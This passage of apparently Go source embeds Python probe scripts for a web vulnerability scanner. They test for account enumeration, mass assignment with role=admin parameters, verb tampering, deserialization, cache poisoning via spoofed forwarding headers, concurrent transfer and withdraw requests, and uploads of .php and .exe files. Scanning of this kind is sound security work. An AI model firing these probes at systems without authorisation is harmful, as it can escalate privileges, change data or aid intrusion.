Rationale:   "Detect user account enumeration via differential responses",
Code: `#!/usr/bin/env python3
"""Auto-generated: Account enumeration detection probe."""
import json
import sys
import urllib.request
import urllib.parse
import urllib.error
import time

def emit(finding):
    print(json.dumps(finding), flush=True)

LOGIN_ENDPOINTS = [
    "/login",
    "/signin",
    "/auth/login",
    "/api/login",
    "/api/auth/login",
    "/users/sign_in",
    "/account/login",
]

def probe_enumeration(target):
    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"
    
    valid_user = "admin"
    invalid_user = "xyznonexistent12345abc"
    password = "wrongpassword123"
    
    for endpoint in LOGIN_ENDPOINTS:
        url = base + endpoint
        
        try:
            # Test with likely valid username
            start1 = time.time()
            req1 = urllib.request.Request(url, method="POST")
            req1.add_header("Content-Type", "application/x-www-form-urlencoded")
            req1.add_header("User-Agent", "Mozilla/5.0")
            data1 = urllib.parse.urlencode({"username": valid_user, "password": password}).encode()
            try:
                with urllib.request.urlopen(req1, data=data1, timeout=10) as resp1:
                    body1 = resp1.read().decode("utf-8", errors="ignore")
                    time1 = time.time() - start1
            except urllib.error.HTTPError as e1:
                body1 = e1.read().decode("utf-8", errors="ignore") if hasattr(e1, "read") else ""
                time1 = time.time() - start1
            
            # Test with invalid username
            start2 = time.time()
            req2 = urllib.request.Request(url, method="POST")
            req2.add_header("Content-Type", "application/x-www-form-urlencoded")
            req2.add_header("User-Agent", "Mozilla/5.0")
            data2 = urllib.parse.urlencode({"username": invalid_user, "password": password}).encode()
            try:
                with urllib.request.urlopen(req2, data=data2, timeout=10) as resp2:
                    body2 = resp2.read().decode("utf-8", errors="ignore")
                    time2 = time.time() - start2
            except urllib.error.HTTPError as e2:
                body2 = e2.read().decode("utf-8", errors="ignore") if hasattr(e2, "read") else ""
                time2 = time.time() - start2
            
            # Compare responses
            if body1 != body2 and len(body1) != len(body2):
                emit({
                    "id": f"enum-response-{endpoint.replace('/', '-')[:10]}",
                    "category": "authentication",
                    "severity": "medium",
                    "title": "Account Enumeration via Response Difference",
                    "description": f"Different responses for valid vs invalid usernames at {endpoint}",
                    "evidence": f"valid_len={len(body1)} invalid_len={len(body2)}",
                    "recommendation": "Return identical responses regardless of username validity",
                })
            
            if abs(time1 - time2) > 0.5:
                emit({
                    "id": f"enum-timing-{endpoint.replace('/', '-')[:10]}",
                    "category": "authentication",
                    "severity": "low",
                    "title": "Account Enumeration via Timing Difference",
                    "description": f"Timing difference: {abs(time1-time2):.2f}s between valid/invalid users",
                    "evidence": f"valid_time={time1:.2f}s invalid_time={time2:.2f}s",
                    "recommendation": "Use constant-time comparisons to prevent timing attacks",
                })
        except Exception:
            pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    probe_enumeration(sys.argv[1])
`,
}
}

func massAssignmentProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "mass_assignment_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect mass assignment vulnerabilities allowing privilege escalation",
Code: `#!/usr/bin/env python3
"""Auto-generated: Mass assignment vulnerability probe."""
import json
import sys
import urllib.request
import urllib.parse
import urllib.error

def emit(finding):
    print(json.dumps(finding), flush=True)

SENSITIVE_PARAMS = [
    ("role", "admin"),
    ("isAdmin", "true"),
    ("is_admin", "true"),
    ("admin", "true"),
    ("privilege", "admin"),
    ("access_level", "10"),
    ("permissions", "all"),
    ("group", "administrators"),
    ("verified", "true"),
    ("email_verified", "true"),
    ("approved", "true"),
    ("active", "true"),
]

API_ENDPOINTS = [
    "/api/user",
    "/api/users",
    "/api/profile",
    "/api/account",
    "/user/update",
    "/profile/edit",
    "/api/v1/users",
]

def probe_mass_assignment(target):
    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"
    
    for endpoint in API_ENDPOINTS:
        url = base + endpoint
        
        for param, value in SENSITIVE_PARAMS:
            # Try PUT/PATCH/POST with sensitive parameter
            for method in ["PUT", "PATCH", "POST"]:
                try:
                    req = urllib.request.Request(url, method=method)
                    req.add_header("Content-Type", "application/json")
                    req.add_header("User-Agent", "Mozilla/5.0")
                    payload = json.dumps({param: value, "name": "test"}).encode()
                    with urllib.request.urlopen(req, data=payload, timeout=10) as resp:
                        body = resp.read().decode("utf-8", errors="ignore")
                        if param in body and value in body:
                            emit({
                                "id": f"mass-assign-{param}",
                                "category": "authorization",
                                "severity": "high",
                                "title": f"Mass Assignment: {param}",
                                "description": f"Server accepted sensitive parameter '{param}={value}'",
                                "evidence": f"endpoint={endpoint} method={method}",
                                "recommendation": "Use allowlists for bindable parameters",
                            })
                except urllib.error.HTTPError as e:
                    if e.code in [200, 201, 204]:
                        emit({
                            "id": f"mass-assign-{param}-accept",
                            "category": "authorization",
                            "severity": "medium",
                            "title": f"Mass Assignment Possible: {param}",
                            "description": f"Server did not reject sensitive parameter",
                            "evidence": f"endpoint={endpoint} status={e.code}",
                            "recommendation": "Validate and restrict bindable parameters",
                        })
                except Exception:
                    pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    probe_mass_assignment(sys.argv[1])
`,
}
}

func verbTamperingProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "verb_tampering_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect HTTP verb tampering bypasses on protected endpoints",
Code: `#!/usr/bin/env python3
"""Auto-generated: HTTP verb tampering probe."""
import json
import sys
import urllib.request
import urllib.error

def emit(finding):
    print(json.dumps(finding), flush=True)

METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"]
CUSTOM_METHODS = ["GETS", "POSTS", "JEFF", "FOO", "ARBITRARY"]

def probe_verb_tampering(target):
    baseline_codes = {}
    
    # Get baseline with standard GET
    try:
        req = urllib.request.Request(target, method="GET", headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            baseline_codes["GET"] = resp.code
    except urllib.error.HTTPError as e:
        baseline_codes["GET"] = e.code
    except Exception:
        baseline_codes["GET"] = 0
    
    # Test each method
    for method in METHODS + CUSTOM_METHODS:
        if method == "GET":
            continue
        try:
            req = urllib.request.Request(target, method=method, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                code = resp.code
                body = resp.read().decode("utf-8", errors="ignore")[:500]
        except urllib.error.HTTPError as e:
            code = e.code
            body = e.read().decode("utf-8", errors="ignore")[:500] if hasattr(e, "read") else ""
        except Exception:
            continue
        
        # Check for bypass (got 200 where GET was 401/403)
        if baseline_codes.get("GET") in [401, 403] and code == 200:
            emit({
                "id": f"verb-bypass-{method.lower()}",
                "category": "authorization",
                "severity": "high",
                "title": f"HTTP Verb Tampering Bypass: {method}",
                "description": f"{method} returns 200 while GET returns {baseline_codes['GET']}",
                "evidence": f"GET={baseline_codes['GET']} {method}=200",
                "recommendation": "Ensure authorization applies to all HTTP methods",
            })
        
        # Check for unexpected method acceptance
        if method in CUSTOM_METHODS and code == 200:
            emit({
                "id": f"verb-custom-{method.lower()}",
                "category": "misconfiguration",
                "severity": "low",
                "title": f"Server Accepts Custom Method: {method}",
                "description": f"Non-standard HTTP method {method} returns 200",
                "evidence": f"method={method} status={code}",
                "recommendation": "Reject unknown HTTP methods",
            })

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    probe_verb_tampering(sys.argv[1])
`,
}
}

func deserializationProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "deserialization_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect insecure deserialization vulnerabilities",
Code: `#!/usr/bin/env python3
"""Auto-generated: Insecure deserialization probe."""
import json
import sys
import urllib.request
import urllib.parse
import urllib.error
import base64
import time

def emit(finding):
    print(json.dumps(finding), flush=True)

# PHP serialized object payloads (benign)
PHP_PAYLOADS = [
    'O:8:"stdClass":0:{}',
    'a:1:{s:4:"test";s:5:"value";}',
    'O:1:"a":1:{s:1:"b";s:1:"c";}',
]

# Java serialized magic bytes
JAVA_MAGIC = base64.b64encode(b'\xac\xed\x00\x05').decode()

# Python pickle (benign)
PYTHON_PICKLE = base64.b64encode(b'\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x00}').decode()

def probe_deserialization(target):
    parsed = urllib.parse.urlparse(target)
    
    # Test for PHP deserialization
    for payload in PHP_PAYLOADS:
        encoded = base64.b64encode(payload.encode()).decode()
        test_url = f"{target}?data={urllib.parse.quote(encoded)}"
        try:
            start = time.time()
            req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=15) as resp:
                elapsed = time.time() - start
                body = resp.read().decode("utf-8", errors="ignore")
                if any(x in body.lower() for x in ["unserialize", "stdclass", "__wakeup", "fatal error"]):
                    emit({
                        "id": "deser-php",
                        "category": "injection",
                        "severity": "critical",
                        "title": "PHP Deserialization Detected",
                        "description": "Server appears to unserialize user input",
                        "evidence": f"payload={payload[:20]}...",
                        "recommendation": "Avoid unserialize() on user input, use JSON instead",
                    })
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="ignore") if hasattr(e, "read") else ""
            if "unserialize" in body.lower():
                emit({
                    "id": "deser-php-error",
                    "category": "injection",
                    "severity": "high",
                    "title": "PHP Deserialization Error",
                    "description": "Deserialization error message exposed",
                    "evidence": f"status={e.code}",
                    "recommendation": "Disable deserialization of user input",
                })
        except Exception:
            pass
    
    # Test for Java serialization endpoints
    java_headers = {"Content-Type": "application/x-java-serialized-object", "User-Agent": "Mozilla/5.0"}
    try:
        req = urllib.request.Request(target, method="POST", headers=java_headers, data=base64.b64decode(JAVA_MAGIC))
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="ignore")
            if any(x in body.lower() for x in ["objectinputstream", "classnotfound", "serialization"]):
                emit({
                    "id": "deser-java",
                    "category": "injection",
                    "severity": "critical",
                    "title": "Java Deserialization Endpoint",
                    "description": "Server processes Java serialized objects",
                    "evidence": "Content-Type: application/x-java-serialized-object accepted",
                    "recommendation": "Disable Java deserialization or use look-ahead deserialization",
                })
    except Exception:
        pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    probe_deserialization(sys.argv[1])
`,
}
}

func cachePoisoningProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "cache_poisoning_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect web cache poisoning vulnerabilities",
Code: `#!/usr/bin/env python3
"""Auto-generated: Web cache poisoning probe."""
import json
import sys
import urllib.request
import urllib.error
import random
import string

def emit(finding):
    print(json.dumps(finding), flush=True)

def random_string(length=8):
    return "".join(random.choices(string.ascii_lowercase, k=length))

UNKEYED_HEADERS = [
    ("X-Forwarded-Host", "evil-{rand}.com"),
    ("X-Forwarded-Scheme", "nothttps"),
    ("X-Original-URL", "/admin"),
    ("X-Rewrite-URL", "/admin"),
    ("X-Forwarded-Proto", "nothttps"),
    ("X-Host", "evil-{rand}.com"),
    ("X-Forwarded-Port", "1337"),
]

def probe_cache_poisoning(target):
    rand = random_string()
    
    for header, value in UNKEYED_HEADERS:
        test_value = value.replace("{rand}", rand)
        
        try:
            req = urllib.request.Request(target, headers={
                "User-Agent": "Mozilla/5.0",
                header: test_value,
            })
            with urllib.request.urlopen(req, timeout=10) as resp:
                body = resp.read().decode("utf-8", errors="ignore")
                headers_dict = dict(resp.headers)
                
                # Check if value reflected
                if test_value in body or rand in body:
                    emit({
                        "id": f"cache-poison-{header.lower()[:15]}",
                        "category": "cache",
                        "severity": "high",
                        "title": f"Cache Poisoning via {header}",
                        "description": f"Unkeyed header {header} reflected in response",
                        "evidence": f"{header}={test_value}",
                        "recommendation": "Include security-relevant headers in cache key or disable reflection",
                    })
                
                # Check cache headers
                cache_status = headers_dict.get("X-Cache", "") or headers_dict.get("CF-Cache-Status", "")
                if "HIT" in cache_status.upper():
                    emit({
                        "id": "cache-present",
                        "category": "cache",
                        "severity": "info",
                        "title": "Caching Detected",
                        "description": "Response served from cache",
                        "evidence": f"cache_header={cache_status}",
                        "recommendation": "Review cache configuration for security",
                    })
        except Exception:
            pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    probe_cache_poisoning(sys.argv[1])
`,
}
}

func raceConditionProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "race_condition_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect race condition vulnerabilities in stateful operations",
Code: `#!/usr/bin/env python3
"""Auto-generated: Race condition probe via timing analysis."""
import json
import sys
import urllib.request
import urllib.error
import time
import threading
import queue

def emit(finding):
    print(json.dumps(finding), flush=True)

RACE_ENDPOINTS = [
    "/api/redeem",
    "/api/coupon",
    "/api/transfer",
    "/api/withdraw",
    "/checkout",
    "/api/vote",
    "/like",
    "/api/apply",
]

def make_request(url, result_queue, idx):
    start = time.time()
    try:
        req = urllib.request.Request(url, method="POST", headers={
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded",
        }, data=b"amount=1")
        with urllib.request.urlopen(req, timeout=10) as resp:
            elapsed = time.time() - start
            result_queue.put((idx, resp.code, elapsed, None))
    except urllib.error.HTTPError as e:
        elapsed = time.time() - start
        result_queue.put((idx, e.code, elapsed, None))
    except Exception as e:
        elapsed = time.time() - start
        result_queue.put((idx, 0, elapsed, str(e)))

def probe_race(target):
    import urllib.parse
    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"
    
    for endpoint in RACE_ENDPOINTS:
        url = base + endpoint
        
        # Send concurrent requests
        result_queue = queue.Queue()
        threads = []
        num_requests = 5
        
        for i in range(num_requests):
            t = threading.Thread(target=make_request, args=(url, result_queue, i))
            threads.append(t)
        
        # Start all at once
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=15)
        
        results = []
        while not result_queue.empty():
            results.append(result_queue.get())
        
        if results:
            success_count = sum(1 for r in results if r[1] == 200)
            timings = [r[2] for r in results if r[2] > 0]
            
            if success_count > 1:
                emit({
                    "id": f"race-{endpoint.replace('/', '-')[:10]}",
                    "category": "logic",
                    "severity": "medium",
                    "title": f"Potential Race Condition: {endpoint}",
                    "description": f"{success_count}/{num_requests} concurrent requests succeeded",
                    "evidence": f"endpoint={endpoint} successes={success_count}",
                    "recommendation": "Implement proper locking/mutex for stateful operations",
                })
            
            if timings and max(timings) - min(timings) > 1.0:
                emit({
                    "id": f"race-timing-{endpoint.replace('/', '-')[:10]}",
                    "category": "logic",
                    "severity": "info",
                    "title": f"Timing Variance: {endpoint}",
                    "description": f"Response time variance: {max(timings)-min(timings):.2f}s",
                    "evidence": f"min={min(timings):.2f}s max={max(timings):.2f}s",
                    "recommendation": "Review for potential race condition or resource contention",
                })

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    probe_race(sys.argv[1])
`,
}
}

func domXssProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "dom_xss_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect DOM-based XSS sinks and sources in JavaScript",
Code: `#!/usr/bin/env python3
"""Auto-generated: DOM XSS source/sink detection probe."""
import json
import sys
import urllib.request
import urllib.error
import re

def emit(finding):
    print(json.dumps(finding), flush=True)

DOM_SOURCES = [
    "document.URL",
    "document.documentURI",
    "document.baseURI",
    "location.href",
    "location.search",
    "location.hash",
    "location.pathname",
    "document.cookie",
    "document.referrer",
    "window.name",
    "postMessage",
]

DOM_SINKS = [
    "innerHTML",
    "outerHTML",
    "document.write",
    "document.writeln",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "Function(",
    "jQuery.html(",
    ".html(",
    "$.globalEval",
    "location.assign",
    "location.replace",
    "element.src",
]

def probe_dom_xss(target):
    try:
        req = urllib.request.Request(target, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = resp.read().decode("utf-8", errors="ignore")
            
            # Find inline scripts
            scripts = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.IGNORECASE)
            all_js = "\n".join(scripts)
            
            # Also check external JS URLs
            ext_scripts = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', body, re.IGNORECASE)
            
            found_sources = []
            found_sinks = []
            
            for source in DOM_SOURCES:
                if source.lower() in all_js.lower():
                    found_sources.append(source)
            
            for sink in DOM_SINKS:
                if sink.lower() in all_js.lower():
                    found_sinks.append(sink)
            
            if found_sources and found_sinks:
                emit({
                    "id": "dom-xss-potential",
                    "category": "xss",
                    "severity": "high",
                    "title": "Potential DOM XSS: Sources and Sinks Present",
                    "description": f"Found {len(found_sources)} sources and {len(found_sinks)} sinks in inline JS",
                    "evidence": f"sources={found_sources[:3]} sinks={found_sinks[:3]}",
                    "recommendation": "Audit data flow from sources to sinks, sanitize user input",
                })
            elif found_sinks:
                emit({
                    "id": "dom-xss-sinks",
                    "category": "xss",
                    "severity": "medium",
                    "title": "DOM XSS Sinks Detected",
                    "description": f"Found {len(found_sinks)} potentially dangerous sinks",
                    "evidence": f"sinks={found_sinks[:5]}",
                    "recommendation": "Review sink usage for user-controlled data",
                })
            
            # Check for jQuery version
            jquery_match = re.search(r'jquery[.-]?(\d+\.\d+\.\d+)', body, re.IGNORECASE)
            if jquery_match:
                version = jquery_match.group(1)
                major, minor, patch = map(int, version.split("."))
                if major < 3 or (major == 3 and minor < 5):
                    emit({
                        "id": "dom-xss-jquery",
                        "category": "xss",
                        "severity": "medium",
                        "title": f"Outdated jQuery: {version}",
                        "description": "Old jQuery versions have known XSS vulnerabilities",
                        "evidence": f"version={version}",
                        "recommendation": "Upgrade jQuery to 3.5.0 or later",
                    })
    except Exception:
        pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    probe_dom_xss(sys.argv[1])
`,
}
}

func httpMethodsProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "http_methods_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Enumerate allowed HTTP methods and detect dangerous ones",
Code: `#!/usr/bin/env python3
"""Auto-generated: HTTP methods enumeration probe."""
import json
import sys
import urllib.request
import urllib.error

def emit(finding):
    print(json.dumps(finding), flush=True)

METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT", "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK"]

DANGEROUS = {
    "TRACE": ("high", "Can enable XST attacks"),
    "CONNECT": ("medium", "Proxy tunneling method"),
    "PUT": ("medium", "May allow file upload"),
    "DELETE": ("medium", "May allow file deletion"),
    "PROPFIND": ("low", "WebDAV enumeration"),
    "PROPPATCH": ("low", "WebDAV modification"),
    "MKCOL": ("medium", "WebDAV directory creation"),
    "COPY": ("medium", "WebDAV file copy"),
    "MOVE": ("medium", "WebDAV file move"),
}

def probe_methods(target):
    allowed = []
    
    # Try OPTIONS first
    try:
        req = urllib.request.Request(target, method="OPTIONS", headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            allow_header = resp.headers.get("Allow", "")
            if allow_header:
                allowed = [m.strip().upper() for m in allow_header.split(",")]
                emit({
                    "id": "http-methods-options",
                    "category": "information",
                    "severity": "info",
                    "title": "HTTP Methods (OPTIONS)",
                    "description": f"Allowed methods: {', '.join(allowed)}",
                    "evidence": f"Allow: {allow_header}",
                    "recommendation": "Disable unnecessary HTTP methods",
                })
    except Exception:
        pass
    
    # Test each method
    for method in METHODS:
        try:
            req = urllib.request.Request(target, method=method, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                if method not in allowed:
                    allowed.append(method)
                
                if method in DANGEROUS:
                    sev, desc = DANGEROUS[method]
                    emit({
                        "id": f"http-method-{method.lower()}",
                        "category": "misconfiguration",
                        "severity": sev,
                        "title": f"Dangerous Method Enabled: {method}",
                        "description": desc,
                        "evidence": f"method={method} status={resp.code}",
                        "recommendation": f"Disable {method} method if not required",
                    })
        except urllib.error.HTTPError as e:
            if e.code not in [405, 501]:
                if method not in allowed:
                    allowed.append(method)
        except Exception:
            pass
    
    if len(allowed) > 5:
        emit({
            "id": "http-methods-many",
            "category": "misconfiguration",
            "severity": "low",
            "title": f"Many HTTP Methods Allowed ({len(allowed)})",
            "description": f"Server allows {len(allowed)} HTTP methods",
            "evidence": f"methods={', '.join(allowed)}",
            "recommendation": "Review and restrict allowed HTTP methods",
        })

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    probe_methods(sys.argv[1])
`,
}
}

func businessLogicProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "business_logic_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect business logic flaws like negative values and boundary issues",
Code: `#!/usr/bin/env python3
"""Auto-generated: Business logic vulnerability probe."""
import json
import sys
import urllib.request
import urllib.parse
import urllib.error

def emit(finding):
    print(json.dumps(finding), flush=True)

LOGIC_TESTS = [
    ("quantity", ["-1", "0", "999999999", "1.5", "1e10"]),
    ("amount", ["-100", "0.001", "999999999"]),
    ("price", ["-50", "0"]),
    ("count", ["-5", "0", "2147483647"]),
    ("discount", ["101", "200", "-50"]),
    ("limit", ["-1", "0", "999999"]),
]

API_ENDPOINTS = [
    "/api/cart",
    "/api/checkout",
    "/api/order",
    "/api/purchase",
    "/api/transfer",
    "/cart/add",
    "/checkout",
]

def probe_business_logic(target):
    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"
    
    for endpoint in API_ENDPOINTS:
        url = base + endpoint
        
        for param, values in LOGIC_TESTS:
            for value in values:
                # Test via query string
                test_url = f"{url}?{param}={value}"
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
                    with urllib.request.urlopen(req, timeout=10) as resp:
                        body = resp.read().decode("utf-8", errors="ignore")
                        
                        # Check for acceptance of invalid values
                        if any(x in body.lower() for x in ["success", "added", "created", "ok"]):
                            if value.startswith("-") or value == "0" or int(float(value)) > 2147483647 if value.replace(".", "").replace("e", "").isdigit() else False:
                                emit({
                                    "id": f"logic-{param}-{value[:5]}",
                                    "category": "logic",
                                    "severity": "high" if value.startswith("-") else "medium",
                                    "title": f"Business Logic Flaw: {param}={value}",
                                    "description": f"Server accepted invalid {param} value",
                                    "evidence": f"endpoint={endpoint} {param}={value}",
                                    "recommendation": f"Validate {param} on server-side with proper bounds",
                                })
                except urllib.error.HTTPError as e:
                    if e.code == 200:
                        emit({
                            "id": f"logic-accept-{param}",
                            "category": "logic",
                            "severity": "medium",
                            "title": f"Boundary Value Accepted: {param}={value}",
                            "description": f"Server processed boundary value",
                            "evidence": f"status=200 {param}={value}",
                            "recommendation": "Implement proper input validation",
                        })
                except Exception:
                    pass
                
                # Test via JSON POST
                try:
                    req = urllib.request.Request(url, method="POST", headers={
                        "User-Agent": "Mozilla/5.0",
                        "Content-Type": "application/json",
                    })
                    payload = json.dumps({param: value if not value.lstrip("-").replace(".", "").isdigit() else float(value)})
                    with urllib.request.urlopen(req, data=payload.encode(), timeout=10) as resp:
                        body = resp.read().decode("utf-8", errors="ignore")
                        if "success" in body.lower():
                            emit({
                                "id": f"logic-json-{param}",
                                "category": "logic",
                                "severity": "medium",
                                "title": f"JSON Business Logic: {param}={value}",
                                "description": "Server accepted JSON with boundary value",
                                "evidence": f"endpoint={endpoint} json={param}:{value}",
                                "recommendation": "Validate JSON payload values",
                            })
                except Exception:
                    pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    probe_business_logic(sys.argv[1])
`,
}
}

func fileUploadProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "file_upload_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect file upload vulnerabilities and bypass techniques",
Code: `#!/usr/bin/env python3
"""Auto-generated: File upload vulnerability probe."""
import json
import sys
import urllib.request
import urllib.parse
import urllib.error

def emit(finding):
    print(json.dumps(finding), flush=True)

UPLOAD_ENDPOINTS = [
    "/upload",
    "/api/upload",
    "/api/files",
    "/file/upload",
    "/media/upload",
    "/images/upload",
    "/api/v1/upload",
]

DANGEROUS_EXTENSIONS = [
    (".php", "PHP script"),
    (".php5", "PHP5 script"),
    (".phtml", "PHP HTML"),
    (".jsp", "Java Server Page"),
    (".jspx", "JSP XML"),
    (".asp", "ASP script"),
    (".aspx", "ASP.NET script"),
    (".exe", "Windows executable"),
    (".sh", "Shell script"),
    (".py", "Python script"),
    (".pl", "Perl script"),
    (".cgi", "CGI script"),
    (".htaccess", "Apache config"),
    (".svg", "SVG with scripts"),
]

def probe_upload(target):
    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"
    
    for endpoint in UPLOAD_ENDPOINTS:
        url = base + endpoint
        
        # Check if endpoint exists
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                body = resp.read().decode("utf-8", errors="ignore")
                if any(x in body.lower() for x in ["upload", "file", "multipart", "choose"]):
                    emit({
                        "id": f"upload-endpoint-{endpoint.replace('/', '-')[:15]}",
                        "category": "upload",
                        "severity": "info",
                        "title": f"Upload Endpoint: {endpoint}",
                        "description": "File upload functionality discovered",
                        "evidence": f"url={url}",
                        "recommendation": "Review file upload security controls",
                    })
                    
                    # Test multipart boundary
                    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
                    
                    for ext, desc in DANGEROUS_EXTENSIONS[:5]:  # Test top 5
                        filename = f"test{ext}"
                        body_data = f'''--{boundary}\r
Content-Disposition: form-data; name="file"; filename="{filename}"\r
Content-Type: application/octet-stream\r
\r
test content\r
--{boundary}--\r
'''
                        try:
                            req2 = urllib.request.Request(url, method="POST", headers={
                                "User-Agent": "Mozilla/5.0",
                                "Content-Type": f"multipart/form-data; boundary={boundary}",
                            }, data=body_data.encode())
                            with urllib.request.urlopen(req2, timeout=10) as resp2:
                                resp_body = resp2.read().decode("utf-8", errors="ignore")
                                if any(x in resp_body.lower() for x in ["success", "uploaded", "saved", filename]):
                                    emit({
                                        "id": f"upload-dangerous-{ext.replace('.', '')}",
                                        "category": "upload",
                                        "severity": "critical",
                                        "title": f"Dangerous Upload Accepted: {ext}",
                                        "description": f"{desc} upload not blocked",
                                        "evidence": f"filename={filename} accepted",
                                        "recommendation": f"Block {ext} file uploads on server-side",
                                    })
                        except urllib.error.HTTPError as e:
                            if e.code in [200, 201]:
                                emit({
                                    "id": f"upload-ext-{ext.replace('.', '')}",
                                    "category": "upload",
                                    "severity": "high",
                                    "title": f"Extension Accepted: {ext}",
                                    "description": f"Server returned success for {ext}",
                                    "evidence": f"status={e.code}",
                                    "recommendation": "Implement extension allowlist",
                                })
                        except Exception:
                            pass
        except Exception:
            pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    probe_upload(sys.argv[1])
`,
}
}
